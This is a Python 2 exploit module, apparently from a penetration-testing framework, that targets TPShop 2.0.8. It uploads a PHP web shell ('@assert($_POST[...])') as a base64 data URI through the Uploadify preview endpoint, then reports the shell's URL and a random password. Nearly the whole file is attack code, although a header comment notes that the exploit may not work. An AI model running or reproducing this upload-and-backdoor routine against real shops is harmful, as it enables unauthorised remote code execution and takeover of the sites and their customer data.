#coding: utf-8

import os
import sys
import datetime
import urllib
from exp_template import Exploit, Level, session, get_random_password
import re, random, base64

"""
构造函数需要传递以下参数:
url      要测试的目标
taskid   默认为0，当没有创建任务时使用
targetid 默认为0，当没有创建任务时使用

exp需要实现的方法为meta_info和exploit
无法实现打击,exp无效
modify by swm 20180817
"""
class tpshop_v208_getshell(Exploit):
    def meta_info(self):
        return {
            'name': 'tpshop_v208_getshell',
            'author': 'h',
            'date': '2018-04-13',
            'attack_type': 'GetShell',
            'app_type': 'CMS',              #路由器为Router
            'app_name': 'TPShop',
            'min_version': '',
            'max_version': '',
            'version_list': '',             #min_version,max_version 和 verion_list 二者必选其一
            'description': 'TPshop 前台无限制Getshell。',
            'reference':'TPshop 前台无限制Getshell.docx',   #参考文档
            'cve':'',
        } 
        
    def exploit(self):
        if self.url == '' or (not self.url.startswith('http://') and not self.url.startswith('https://')):
            self.report('url error', Level.error)
            return
        for i in range(10):
            self.url = self.url.strip('/')
        req = session()
        try:
            rsp = req.get(url=self.url)
        except:
            self.report('连接目标失败', Level.error)
            return
        try:
            randpass = get_random_password(5)
            upload_data = "data:image/php;base64,%s" % ( base64.b64encode('<?php @assert($_POST[%s]); ?>' % randpass))
            headers = {
                'Content-Type':'application/x-www-form-urlencoded', 
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36',
            }
            rsp = req.post(self.url+'/index.php/Home/Uploadify/preview/', data=upload_data, headers=headers)
            print rsp.text
            m = re.search(r'"result".*?"(.*?)"', rsp.text)
            if m:
                path = m.group(1).split('/')[-1]
                self.shell_info(self.url+ '/preview/'+path, randpass, 'php')
        except Exception as e:
            return
        
if __name__ == "__main__":
    # url = 'http://localhost:93/TPshop_2.0.8/'
    # a = tpshop_v208_getshell(url)
    # a.exploit()
    if len(sys.argv) == 2:
        a = tpshop_v208_getshell(sys.argv[1])
        a.exploit()
    else:
        print '%s url' %  __file__
        print '%s http://192.168.1.11' %  __file__


